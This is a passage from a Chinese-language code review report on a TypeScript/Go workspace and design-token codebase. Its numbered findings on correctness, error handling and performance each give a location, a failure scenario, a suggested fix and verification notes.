**验证备注**: 实测确认。getTokenValue(L75)与 resolveTokenValue 缓存(L43)对裸名查普通对象命中 Object.prototype。tsx 跑真实源码:semantic.accent.default 引用 constructor 时 validateThemeManifest 返回 valid:true,resolvedTokens 得 Object 函数,createCssVariables 输出 var(function Object)。

##### M-C-43 解码接受仅指向 inline set 的引用,plan 只能解析 document.sets 而静默丢源

- **位置**: [`packages/tokens/src/designTokenResolutionPlan.ts:128`](packages/tokens/src/designTokenResolutionPlan.ts#L128)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-tokens-router

**详情**: validateReferences 的 setNames(dtcgDesignTokenResolverCodec.ts:722-724)由入参 sets 建立,而 878-886 行把 inline resolutionOrder set 定义一并传入,故 sources 中 #/sets/inlineOnlyName 的存在性校验通过、decode ok。但 plan 侧 const setsByName = new Map(document.sets.map)(128-130 行)只含 top-level sets(解码产物 903-910 行 sets 仅取 parsedSets.definitions),expandSources(22-31 行)对查不到的 set 执行 if (set) expandSources; return 静默丢弃,无任何 issue。解码命名空间与 plan 解析域不一致。

**失败场景**: modifiers.mode.contexts.light.sources 引用 #/sets/brand,brand 仅作为 inline set 出现在 resolutionOrder,decode ok:true;createDesignTokenResolutionPlan(doc, mode light) 中 light 上下文的该引用被静默丢弃,本应在 modifier 上下文优先级并入/复用的 token 缺失或最终合并值与预期不符,且无诊断输出。

**修复建议**: 解码侧 setNames 仅限 top-level sets,对指向 inline-only 名的 #/sets/x 产出 DTR_REFERENCE_MISSING(fail closed,该指针在文档 JSON 中也确实不存在);或让 expandSources 的解析域与校验域统一(含 inline 定义)。

**验证备注**: 已读码并实跑复现。codec 878-896 把 resolutionOrder 的 inline set(declaration===inline)并入 validateReferences 入参,setNames(722-724)含 inline-only 名,故 740-749 校验通过,decode ok:true;但 906 行 sets 仅取 parsedSets.definitions(top-level)。plan 侧 setsByName(128-130)只含 top-level。

##### M-C-44 Resolver set 循环检测因 inline 同名覆盖被绕过,plan 无限递归崩溃

- **位置**: [`packages/tokens/src/dtcgDesignTokenResolverCodec.ts:767`](packages/tokens/src/dtcgDesignTokenResolverCodec.ts#L767)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-tokens-router

**详情**: 最小触发文档需补充:仅内联 type set name BASE sources 空 只会让 decode ok:true(环校验确被绕过),plan 也 ok:true 不崩溃;还须 resolutionOrder 含进入该环的条目(如引用 #/sets/Base,属正常用法),expandSources 才会沿 Base 到 Other 到 Base 无限递归抛 RangeError。其余机制描述准确。

**失败场景**: resolver 文档 top-level sets Base/Other 互引成环,且 resolutionOrder 含内联 type set name BASE sources 空,折叠名 base 的 inline 边覆盖 Base 的边,decode ok:true,createDesignTokenResolutionPlan 中 expandSources 沿 Base 到 Other 到 Base 无限递归,RangeError: Maximum call stack size exceeded,调用方(packages/workspace 的 resolver 解析流)整体崩溃而非收到 DTR_REFERENCE_CYCLE。

**修复建议**: inline 条目名与 top-level sets/modifiers 名做大小写折叠去重并产出 DTR_ORDER_INVALID;或环图改用唯一定义键;expandSources 增加 visiting 守卫,发现环时产出 issue 而非无限递归。

**验证备注**: 实测确认:validateReferences 环图(767-774 行)用折叠名做 Map 键,入参(878-886)内联 set 排 top-level 之后,同名折叠键被空 sources 覆盖;orderNames(564/676 行)仅查内联互斥,不比对 top-level 名。跑 tsx 复现:Base 与 Other 成环加内联 BASE(sources 空) decode ok:true(对照组无内联时正确报 DTR_REFERENCE_CYCLE)。

##### M-C-45 $ref 加 overrides 重解析出的定义完全绕过 validateReferences(fail-open)

- **位置**: [`packages/tokens/src/dtcgDesignTokenResolverCodec.ts:882`](packages/tokens/src/dtcgDesignTokenResolverCodec.ts#L882)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-tokens-router

**详情**: parseResolutionOrder 对带 overrides 的 $ref 条目用 raw 展开加 reference.overrides 重新 parseSet/parseModifier(602-610、631-639 行),生成 declaration reference 的条目(615、644 行)。但 878-896 行调用 validateReferences 时只收集 parsedSets/parsedModifiers 与 entry.declaration === inline 的定义(882、890 行的过滤条件),overrides 中新写入的 sources 既不做 set 存在性校验,也不校验 set/context 不得引用 modifier,decode 仍返回 ok:true。

**失败场景**: resolutionOrder 含 $ref #/sets/base 且 sources 引用 #/sets/ghost(或 sources 指向 #/modifiers/theme),decodeDtcgDesignTokenResolverDocument 返回 ok:true;createDesignTokenResolutionPlan 的 expandSources 在 setsByName 找不到 ghost 便静默跳过,plan 成功但该 order 条目不产出任何 source——悬空/非法引用被当作成功提交。

**修复建议**: validateReferences 的入参应包含所有 resolutionOrder 条目(无论 declaration)的 set/modifier 定义;或在 parseResolutionOrder 重解析 overrides 后就地校验其 sources 的存在性与目标类型。

**验证备注**: 代码与运行双重证实。parseResolutionOrder 对带 overrides 的 $ref 用 raw 加 overrides 重解析(602-610)并推入 declaration reference 条目(615);878-896 调 validateReferences 的 flatMap 仅收 declaration===inline(882/890),重解析定义不被校验;parseSource/parseReference(264-328)只做形状检查。

##### M-C-46 resolutionOrder 唯一性只覆盖 inline 条目,重名重复项在 plan 中被静默丢弃

- **位置**: [`packages/tokens/src/dtcgDesignTokenResolverCodec.ts:667`](packages/tokens/src/dtcgDesignTokenResolverCodec.ts#L667)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-tokens-router

**详情**: parseResolutionOrder 的 orderNames 折叠去重仅在 inline 分支执行(666-676 行),$ref 分支(576-648 行)从不参与去重,inline 与 $ref 重名(含大小写差异)可解码通过。plan 侧 effectiveModifiers 按折叠名首胜(designTokenResolutionPlan.ts:44-57),selection 以 definition.name 精确写入(112 行),而 orderedSources 循环用 const contextName = selection[entry.name](148 行)精确查找,大小写不一致即查不到,if 非 context return(152 行)静默跳过整条 order 项,不产出 issue。

**失败场景**: modifiers.theme 存在;resolutionOrder 含 type modifier name Theme 加 contexts 加 default light,再含 $ref #/modifiers/theme,decode ok:true;createDesignTokenResolutionPlan(doc,空) 的 orderedSources 完全不含第二个条目,用户拿到的成功 plan 实际少了一个顺序项,token 合并优先级与作者意图不符且无告警。

**修复建议**: $ref 分支解析出 existing.name 后同样参与 orderNames 大小写折叠去重并产出 DTR_ORDER_INVALID;plan 侧对 selection 缺失应产出 issue 而非静默 return。

##### M-C-47 previews 跳过 null 预览导致与 files 数组索引错位,预览图/文件名/删除目标错配

- **位置**: [`packages/ui/src/form/PdxImageUpload.tsx:64`](packages/ui/src/form/PdxImageUpload.tsx#L64)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-form

**详情**: 核心错位属实,另补充:null 预览文件在尾部时(如 jpg,tiff),删掉可见预览后残余文件无任何预览/删除入口却仍在 files/onChange 载荷中,静默上传。组件为 manifest 中 lab 级且现网仅单文件目录预览使用,故降为 medium。

**失败场景**: multiple=true,用户拖入 scan.tiff 与 photo.jpg:tiff 返回 null 被跳过,previews 仅含 photo 的 blob。唯一预览卡显示 photo.jpg 图像但标注文件名 scan.tiff;用户点击 Remove scan.tiff 实际执行 files.filter(index 不等于 0),移除的是 scan.tiff(files[0]),与所见意图相反;后续上传载荷因此缺少用户想保留的文件。

**修复建议**: 让 previews 与 files 保持等长(对 null 保留占位、渲染时过滤但用原索引),或直接改为 files.map 并在单项内持有预览 URL,使图像、文件名、删除索引天然对齐。

**验证备注**: effect 64-68 行 if (url 且 isBlobPreviewUrl(url)) urls.push(url) 丢弃 null,previews 与 files 错位;渲染 169 行 previews.map 用同 index 取 files[index]?.name(173/177 行),删除 185 行 files.filter(fileIndex 不等于 index)。imageUploadPreview.ts 中 tiff 因 type 判断返回 null。

##### M-C-48 外层 div 与 input 复用同一 id,重复 DOM id 破坏 label 关联

- **位置**: [`packages/ui/src/form/PdxRegexInput.tsx:115`](packages/ui/src/form/PdxRegexInput.tsx#L115)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ui-form

**详情**: 第 102 行外层容器 div 含 id={id} 与第 115 行 input 含 id={id} 使用了同一个 id。第 106 行 label htmlFor={id} 按 DOM 树序解析到的是外层 div(非 labelable 元素),input 实际没有可编程关联的标签。对比 PdxImageUpload/PdxFileUpload 正确地使用 id-input 派生 id。

**失败场景**: 使用方传 id=email 时:页面出现两个 id=email 的节点;点击 label 不会聚焦输入框;屏幕阅读器读不出字段名;使用方或第三方 document.getElementById(email).focus() 拿到的是容器 div,focus/滚动定位全部打偏。

**修复建议**: 容器 id 与控件 id 分离:把 id 只保留在 input 上,容器改用 id-root 或不设 id;或复用仓库已有的 usePdxFieldIds 生成 controlId。

**验证备注**: 已读 PdxRegexInput.tsx:L101 div id={id}、L106 label htmlFor={id}、L115 input id={id},重复 id 属实;PdxComponent.ts:6 证明 id 为公开 prop,无校验;对照 PdxImageUpload.tsx:50/130/161 的 id-input 与 usePdxFieldIds 证实仓库正确模式。

##### M-C-49 Outbox 因果排序在同毫秒下以随机 UUID 兜底,依赖型操作会被乱序提交

- **位置**: [`packages/workspace-sync/src/workspaceOutbox.ts:128`](packages/workspace-sync/src/workspaceOutbox.ts#L128)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ws-sync

**详情**: 服务端实际返回 422 WKS-5002(response.go 将 ErrWorkspacePatchPathMissing 映射为 StatusUnprocessableEntity,非原发现所述的 400);但非冲突信封、retryable=false、failed head 永久阻塞队列、离线重放抛 WKS_SYNC_REPLICA_OPERATION_REPLAY_FAILED 致副本无法打开等结论均成立。触发条件为同毫秒派发且 UUID(B) 小于 UUID(A)(约50%)。

**失败场景**: AI/批量流同步派发两个同毫秒、同 base S 的依赖操作:A(新建节点 n1)、B(replace /ui/graph/nodesById/n1 的字段),且 UUID(B) 小于 UUID(A)。线上:B 成为 causal head 先提交,expected 版本与服务器 S 相符、CAS 通过,但补丁在无 n1 的状态上应用失败,后端返回 422(非 WKS-400x 冲突信封),客户端判定 not-conflict、retryable=false,B 永久 failed 并阻塞 head,A 永远无法发送。离线:materializeWorkspaceLocalReplica 在 S 上先重放 B 失败,WKS_SYNC_REPLICA_OPERATION_REPLAY_FAILED,本地副本无法打开。

**修复建议**: 为 outbox 记录引入真正的单调插入序:入队时分配按 workspace 递增的 seq(存储层计数器或 auto-increment),compareEntries 优先按 seq 排序,createdAt 仅作参考;或改用有序 id(ULID/时间戳-计数器-随机 复合 id),保证先创建的操作恒小,杜绝同毫秒随机定序。

**验证备注**: compareEntries(L124-130)同毫秒按 causalOrderId/id 码点定序,二者皆 operationId(L196-198),生产用 crypto.randomUUID() 无序;createdAt=Date.now()(VfsOutboxExecutor L33)。乐观 apply 不推进 contentRev,B 的 expected 与 A 同为 S,CAS 无法辨序。

##### M-C-50 投影文件路径冲突:.prodivix/ 下的 code 文档覆盖清单或其他文档内容

- **位置**: [`packages/workspace/src/workspaceProjection.ts:113`](packages/workspace/src/workspaceProjection.ts#L113)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ws-core

**详情**: 静默 ok:true 损坏需非 code 文档文件后写入 createSourceFileMap(docsById 插入序 B 先 A 后);反序时非 code 文档取到 text/plain 源码,decodeWorkspaceDocument 抛错 ok:false 显性失败。但任一顺序往返都丢一份文档内容,其余描述与代码一致。

**失败场景**: 工作区含非 code 文档 /z.ts 与 code 文档 /.prodivix/documents/z.ts(VFS 合法且路径不同),两者 contentPath 均为 .prodivix/documents/z.ts;往返读取时 filesByPath 只留一份,code 文档 B 的 source 被静默替换为另一文档的 JSON 文本,readWorkspaceFromProdivixFiles 仍返回 ok:true(Git 投影/导出后内容丢失)。若 code 文档建于 /.prodivix/workspace.json,清单文件被源码覆盖,整个投影读取报 WKS_PROJECTION_JSON_INVALID。

**修复建议**: 在 VFS/文档创建路径处保留 .prodivix/ 前缀(拒绝以 /.prodivix 开头的文档路径),或把 code 内容也投射到受保护目录(如 .prodivix/documents/code/path),并在 projectWorkspaceToProdivixFiles 中对重复 path 显式报错而非静默输出两份。

**验证备注**: 证实。documentContentPath(113-123):code 走 normalizeSourcePath 无前缀,非 code 落 .prodivix/documents/。isCanonicalWorkspaceDocumentPath(validation 45-63)与 isCanonicalNodeName(vfs 32-38)仅禁 ./.. 段,/.prodivix/* 合法且过 validateWorkspaceSnapshot。

#### 3.3.4 error-handling

##### M-EH-01 UseSecret 在 consumer 已消费明文之后复查过期,返回错误并漏记审计

- **位置**: [`apps/backend/internal/modules/environment/store.go:463`](apps/backend/internal/modules/environment/store.go#L463)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-env-auth

**详情**: 缺陷属实但触发路径应修正:真实可达调用方是 data_gateway/data_gateway_protocol/data_gateway_stream(consumer 内做远程 transport.Execute/OpenStream,传输超时允许 15-30s);isolated_secret_broker 的 consumer 仅内存拼 JSON,竞态实际不可达。双重消费仅限带幂等策略的 mutation。另有一更易触发变体:415 行 5s databaseContext 被复用于 466 行审计 INSERT,consumer 超 5s 即审计失败并返回错误,无需过期竞态。

**失败场景**: 剩余寿命 100ms 的 grant 进入 UseSecret,consumer 做远程提交耗时 300ms 并成功,返回后复查失败,调用方收到 ErrPermissionDenied,审计表无 secret-used 行,调用方按错误路径重新 IssueGrant 加 UseSecret,同一 secret 被消费两次且仅第二次(或零次)有审计记录。

**修复建议**: 以 consumer 执行前的单一时间点判定成功/失败;consumer 成功后只补记审计(可标记 used-near-expiry),不再返回错误,避免部分失败当全失败。

**验证备注**: store.go:460 先 consumer(material) 消费明文,463 行 expiresAt 不晚于 now 复查失败返回 ErrPermissionDenied 并跳过 466 行 secret-used 审计;438 行预检无余量。grant 上限 5 分钟(行20),gateway 调用方发 30s grant(data_gateway.go:728),其 consumer 做真实远程调用。

##### M-EH-02 terminal transition 已提交后 closeExecution 抛错返回错误,重试恒得 409

- **位置**: [`apps/remote-runner-control-plane/src/httpHandler.ts:560`](apps/remote-runner-control-plane/src/httpHandler.ts#L560)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: app-runner-cp

**详情**: 缺陷真实但状态码描述不准:KMS 抖动抛的 CipherUnavailableError 在 support L394/423 被包装为 RemoteExecutionTerminalBrokerError(unavailable),外层 catch L901-902 经 terminalErrorStatus 映射为 409 unavailable,非统一 500 internal;仅原生 Postgres 错误才 500。无论哪种,已提交终态都返回错误、重试恒 409 lease-rejected;残留会话由每 60s sweepExpired 兜底回收,最终一致,故 medium 合适。

**失败场景**: worker 上报 succeeded 的瞬间 KMS 抖动,closeExecution 抛错,响应错误,worker 重试,409 lease-rejected,worker 侧判定终态转换失败(告警、反复重试或把本地运行标记为失败),而控制平面实际已是 succeeded;残留终端会话只能等 sweepExpired 按租约过期兜底清理。

**修复建议**: transition 提交后的 closeExecution 用 try/catch 包裹并内部低调度量/记录,保证已提交终态始终返回 200;会话关闭交由 sweepExpired 收敛,不让 best-effort 清理遮盖已提交结果。

**验证备注**: httpHandler L545 先 await transition(提交终态)再 L560 await closeExecution 才回 200;postgresExecutionRepository transitionLocked L243-246 终态置 lease_* 全 NULL,repository.transition L511 租约匹配失败返回 undefined,L554 恒 409 lease-rejected。

##### M-EH-03 rehydrate 失败时 hasHydrated 永远为 false,导致认证流程死锁

- **位置**: [`apps/web/src/auth/useAuthStore.ts:54`](apps/web/src/auth/useAuthStore.ts#L54)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-app-infra

**详情**: 机制属实但触发需前置条件:该键须被外部写坏(应用自身 JSON.stringify 加原子 setItem 不会产出非法 JSON)。且登录成功后 persist 每次 set 都会 setItem(middleware.js:368-371)覆盖坏键,故整页刷新即可自愈,并非只能手动清 localStorage;死锁仅限单次 SPA 会话内。建议降为 medium。

**失败场景**: localStorage prodivix-auth-session 为非法 JSON(被手工改写/损坏),应用加载时 persist 解析抛错,回调收到 undefined 提前 return,hasHydrated 恒为 false。用户在 AuthPage 登录成功(setSession 已写入有效 token)后 navigate /profile,ProfilePage 仍因非 hasAuthHydrated 渲染未登录空态;EditorHome 的加载 effect 永久早退、项目列表不加载。此后 SPA 内反复登录都无效,形成认证死锁,只能整页刷新或手动清 localStorage 才恢复。

**修复建议**: 回调中无条件执行 setHasHydrated(true)(state 为 undefined 或存在 error 时也要置 true),并在 error 分支清理损坏的持久化项(如 localStorage.removeItem prodivix-auth-session),避免单个损坏键永久阻塞整个认证门控。

**验证备注**: 核对 zustand@5.0.14 middleware.js:getItem 到 JSON.parse 对非法 JSON 同步抛错(290-300),toThenable catch(321)后 hydrate 的 .catch 调 postRehydrationCallback(void 0, e)(439)。useAuthStore.ts:54 if 非 state return 使 setHasHydrated(true) 永不执行;grep 证实全仓库无其他设置路径。

##### M-EH-04 WebGPU 后端把失败的 adapter/device 请求永久缓存,瞬时失败后无法恢复

- **位置**: [`apps/web/src/editor/codeCompile/browserShaderCompilerBackends.ts:169`](apps/web/src/editor/codeCompile/browserShaderCompilerBackends.ts#L169)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-editor-core

**详情**: 瞬时 reject 固化 null 后 compile 返回 reason This browser does not provide an available WebGPU device;但设备 lost 时 createShaderModule 抛错,走 227-231 行 catch,reason 实为 The WebGPU compiler failed to produce compilation info,两者均因单例缓存永久失效直到刷新。

**失败场景**: 编辑器加载时 GPU 占用较高导致 requestAdapter 一次性 reject,devicePromise 被固化为 resolved(null),用户之后编辑任何 WGSL 着色器,诊断面板永远显示 WebGPU 不可用,直到整页刷新;设备 lost(驱动重置/休眠恢复)后同样永久失效。

**修复建议**: 失败时不缓存(catch 中把 devicePromise 复位为 null 允许重试),并在 device.lost 事件后清空缓存、重新 requestAdapter/requestDevice。

**验证备注**: 代码事实成立:workspaceShaderCompileEnvironment.ts:32-42 模块级单例注册该后端;getDevice()(164-174 行)将 devicePromise 闭包缓存且 .catch 返回 null 吞掉 reject,从不复位;全文件无 device.lost 监听。对照 WebGL2 后端 55-61 行有 isContextLost 重建,WebGPU 缺失恢复逻辑。

##### M-EH-05 动画持久化被拒绝时静默吞错且不再重试

- **位置**: [`apps/web/src/editor/features/animation/useAnimationEditorState.ts:154`](apps/web/src/editor/features/animation/useAnimationEditorState.ts#L154)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-anim-conflict

**详情**: 细节修正:并非所有路径都 console.warn——86 行(status 非 valid)与 99 行(非 command)直接静默 return false,105-111/118-121 才 warn;结论(被吞、void 忽略、签名已提交不重试、UI 无呈现)不变。另:继续编辑触发下一次全量写入可间接覆盖早前失败版本,但若最后一次写入失败且不再编辑/不点 Play,刷新或切文档仍丢编辑。

**失败场景**: 用户持续编辑动画,某次写入因 Outbox IndexedDB 配额/锁定失败或 augmentWorkspaceOperationWithControlledSource 校验拒绝而被 rejected:界面看似自动保存,实际该版本从未进入 Outbox;切换文档或刷新后编辑丢失。只有点击 Play 触发 flushPendingPersistence 失败时才给提示。

**修复建议**: dispatch 成功后再推进 committedSignatureRef(失败时保持可重试);将 rejected message 上抛到 editorStore 的诊断/错误状态,由 AnimationEditorContent 的 visibleDiagnostic 呈现给用户。

**验证备注**: 读 useAnimationEditorState:154 在 155 行 void dispatch 前先提交 committedSignatureRef,153 行 currentSignature===committed 早退使同签名不重试。86/99 行静默 return false,105-111、118-121 仅 console.warn 后 return false,调用点 void 忽略。

##### M-EH-06 switchGraph 忽略 persistCanvas 失败,无条件切换文档导致未保存编辑丢失

- **位置**: [`apps/web/src/editor/features/development/reactflow/useNodeGraphWorkspaceDocumentManager.ts:240`](apps/web/src/editor/features/development/reactflow/useNodeGraphWorkspaceDocumentManager.ts#L240)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-dev-b

**详情**: 结论成立,但 workspace 运行时变 readonly(协同锁定)与现状不符:Editor.tsx 对远程 workspace 仅在加载时置 readonly=false,无动态只读接线;真实可达的拒绝源是同步本地项目加载时只读(Editor 244/255)、dispatchWorkspaceCommand 校验失败与 outbox 竞态。且 rejected 时会经 setHint 显示 2.2 秒提示,并非完全静默,仅是提示与切换解耦、编辑仍被覆盖丢失。

**失败场景**: 用户正在编辑图 A,此时 workspace 变为只读或命令因冲突被 rejected;用户点击切换到图 B:persistCanvas resolve(false) 但 finally 仍执行 selectNext;A 的最后一批画布编辑被 B 的内容覆盖且自动保存被抑制,编辑静默丢失,仅有一条易被忽略的 hint。

**修复建议**: 改为 const ok = await persistCanvas(nodes, edges); if (ok) selectNext(); else setHint(保存失败提示),失败时留在当前文档,与 deleteGraph/runActiveGraph 的失败处理保持一致。

**验证备注**: L240 void persistCanvas(...).finally(selectNext) 确忽略布尔值;scheduleWorkspaceCommand 在 workspace 缺失(201)、rejected(209-212)、异常(219-227)时 resolve(false),dispatcher(32-39) readonly 即拒绝,outbox 竞态亦可拒绝。切换后 hydration(268-289)覆盖画布。

##### M-EH-07 core.http 客户端活体请求校验后丢弃 literal authorization,静默不带凭证发请求

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts:1460`](packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts#L1460)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: invokeLiveHttp 对 source/operation 的 configurationByKey.authorization 只调用 literalConfiguration(对 environment-ref/secret-ref 抛 DATA_STANDALONE_ENVIRONMENT_UNAVAILABLE),返回值被丢弃,requestHeaders(1519-1523 行)从不包含 Authorization。对比 invokeLiveGraphql/invokeLiveAsyncApi(1617、1752 行)对任何 authorization(含 literal)直接 throw。两种意图下现状都错:若 literal 凭证应发送则漏发;若客户端不应带凭证则 literal 也应拒绝而非静默通过。

**失败场景**: 作者给 client 区 core.http source 配置 authorization kind literal value Bearer xyz,导出无任何诊断;运行时请求不携带 Authorization 头,上游 401,快照变 DATA_HTTP_STATUS_FAILED,作者无法从诊断得知凭证配置未被应用。

**修复建议**: 明确语义二选一:要么把 literal 值作为 Authorization 头加入 requestHeaders(并做 CRLF/头部字符校验),要么与 GraphQL/AsyncAPI 一致对任何 authorization 配置抛失败码,不要校验后丢弃。

**验证备注**: 核对:invokeLiveHttp 1459-1462 对 authorization 仅语句级调用 literalConfiguration(466-477:env/secret-ref 抛 ENVIRONMENT_UNAVAILABLE,literal 返回值被丢弃)。requestHeaders 1519-1523 只含 mappedRequest.headers/content-type/幂等头,mapRuntimeHttpRequest(718)不接收 authorization。

##### M-EH-08 乐观 commit 在突变成功后抛错会回滚已生效变更且跳过重验证

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataRuntime.ts:894`](packages/prodivix-compiler/src/react/standaloneDataRuntime.ts#L894)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: 真实触发路径是 commit 内 selectPointer(result.value, valueOutputPath)(663 行)在服务器响应缺该路径时抛 DATA_INPUT_VALUE_MISSING;而缺 valueOutputPath 抛 DATA_OPTIMISTIC_POINTER_INVALID 已被上游文档校验(dataDocument.ts 1348-1356 要求 create/update 必填 valueOutputPath)阻断,非现实路径。output 校验(556-562)用作者自定义 Ajv schema,与 valueOutputPath 无交叉校验,故响应可通过校验却缺指针路径。

**失败场景**: optimistic update 策略 valueOutputPath=/entity,服务端成功但返回 ok true(无输出 schema 约束),invoke 成功,commit 抛错,客户端把乐观行回滚成旧值且不清缓存/不重验证,上报 DATA_INPUT_POINTER 类错误;服务端保存了新数据,界面持久与服务端背离。

**修复建议**: commit 失败不应回滚已成功突变:catch 中区分 invoke 失败与 commit 失败,commit 失败时保留乐观态并强制执行 cacheEntries.clear() 加 trackedQueries 重验证,把错误降级为诊断/告警。

**验证备注**: 读 866-906:commit(894)在 try 内,catch(895-897)rollback 加 rethrow,跳过 900 clear 与 901-904 重验证。settle commit(652-675)非 delete 走 663 selectPointer,187-203 在路径缺失时抛 DATA_INPUT_VALUE_MISSING。

##### M-EH-09 validateContribution 对 provider 的 rewrite 字段未做形状校验,畸形贡献会抛 TypeError 崩溃整个提取计划

- **位置**: [`packages/workspace/src/component/workspaceComponentExtractionReferenceRegistry.ts:124`](packages/workspace/src/component/workspaceComponentExtractionReferenceRegistry.ts#L124)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ws-component

**详情**: 技术缺陷属实可复现,但提取 UI 直接报错略夸大:当前 Web 调用方 planExtraction(useWorkspaceComponentAuthoring.ts:406)未传 referenceProviders,仅运行类型安全的内置 provider(createPirRewrite),故现阶段 UI 不触发。缺陷经 index.ts 公开导出、面向 plugin 域 provider,属潜在错误处理缺陷——一旦外部 provider 返回缺 publicTarget/forwardOps/reverseOps 的 truthy rewrite,即在 124/127/128 行抛未捕获 TypeError,而非落 providerContributionInvalid。维持 medium。

**失败场景**: 编辑器/插件传入 referenceProviders 含一个贡献 classification rewritable-to-public-contract 且 rewrite 缺 publicTarget,validateContribution 在第 124 行抛 TypeError,整个提取规划调用异常中断,而不是按设计返回 status blocked 加 providerContributionInvalid issue 列表,提取 UI 直接报错。

**修复建议**: 在访问字段前先校验形状:!isRecord(rewrite) 或 !isRecord(rewrite.publicTarget) 或 componentDocumentId 非规范文本 或 forwardOps 非数组或为空 或 reverseOps 非数组,与现有 owner/target 的 isRecord 守卫保持一致,使畸形贡献落到 providerContributionInvalid 分支。

**验证备注**: 属实。validateContribution 第70-79行对 contribution/owner/target 用 isRecord、CLASSIFICATIONS.has 防御校验,但 rewrite 分支(121-128)仅判空,随后直接成员访问 rewrite.publicTarget.componentDocumentId(124)、rewrite.forwardOps.length(127)、rewrite.reverseOps.length。

##### M-EH-10 applyWorkspaceMutation 无法清除失效的 activeDocumentId,导致已确认 mutation 永远无法采纳

- **位置**: [`packages/workspace/src/workspaceCodec.ts:752`](packages/workspace/src/workspaceCodec.ts#L752)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ws-core

**详情**: 机制属实,补充两点:1) 服务端并非偶尔不附带 activeDocumentId,而是结构性永不发送(后端按 ephemeral 过滤且响应构造器无此字段,客户端响应解码也禁止该字段);2) 无需多客户端:单客户端删除自己正打开的活动 code 文档即触发——outbox 条目 baseSnapshot 为操作前快照(仍指向被删文档),ACK 时在 workspaceOutboxExecutor:415 确定性抛错,entry 不可变、重试不改变基,causal head 永久阻塞后续全部操作。异常被执行器捕获转为可重试失败,非未处理崩溃。

**失败场景**: 一个不含 pir-page 的合法纯 code 工作区(activeDocumentId 指向某 code 文档),服务端确认删除该活动文档的 mutation 且未附带新的 activeDocumentId,回退找不到 pir-page,旧 id 泄漏,校验抛 WorkspaceCodecError,本地副本永远无法采纳该已确认 mutation,同步卡死。

**修复建议**: 当请求的活动文档已被删除且无可用回退时,显式删除该键:先构造 nextWorkspace,再 if 非 activeDocumentId delete nextWorkspace.activeDocumentId;或在 wire 契约中支持显式 null 表示清除,并让 docsById 缺失时一律清除而不是沿用旧值。

**验证备注**: 属实。codec.ts:739 requestedActiveDocumentId=mutation.activeDocumentId 或 workspace.activeDocumentId,而确认 mutation 恒无此字段(response.go:194 BuildMutationSuccessPayload 从不输出)。回退 resolveCanonicalWorkspaceDocumentId(:16-31)只匹配 pir-page。

#### 3.3.5 performance

##### M-P-01 每次 operation commit 对全部 asset 文档逐个 SELECT,O(资产数) 放大且持锁

- **位置**: [`apps/backend/internal/modules/workspace/asset_blob.go:363`](apps/backend/internal/modules/workspace/asset_blob.go#L363)
- **类别**: performance ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: be-ws-a

**详情**: validateWorkspaceAssetBlobReferences 对传入的全部文档排序后逐个处理,对每个 doc_type=asset 的文档执行一次点查 SELECT media_type, byte_length FROM workspace_asset_blobs WHERE workspace_id 与 digest(asset_blob.go:372-377)。store_operation_commit.go:131 在每次 CommitWorkspaceOperation 都把完整的 state.Documents(而非变更集)传给它;紧随其后 store_operation_commit.go:139 调用 reconcileWorkspaceAssetBlobReferenceRetention(asset_blob_retention.go:242-252),每次 commit 还会对当前全部 asset digest 执行一次带 jsonb_array_elements 的 UPDATE。这一切发生在 5 秒 withStoreTimeout 且持有 workspaces 行 FOR UPDATE 锁的事务内。

**失败场景**: 一个以设计系统/素材库为主、含数千个二进制 asset 文档的 workspace,用户即使只对某个 code 文档做单字符编辑提交,每次 commit 也会在持锁事务中执行数千次 SELECT 加一次大 IN 列表 UPDATE;在 Outbox 逐键提交或并发提交场景下,5 秒超时内完成不了即提交失败,且行锁放大阻塞同 workspace 的其他 commit。

**修复建议**: 仅在 commit 的变更集涉及 asset 文档(新增/修改/删除)时才做 blob 引用校验;或将逐文档点查改为单条 digest = ANY($2) 批量查询;reconcile 的 protect UPDATE 可只在 asset digest 集合发生变化时执行。

##### M-P-02 平移/缩放每帧导致整棵 PIR 渲染树重渲染(回调引用不稳定)

- **位置**: [`apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts:742`](apps/web/src/editor/features/blueprint/editor/controller/useBlueprintEditorController.ts#L742)
- **类别**: performance ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-canvas

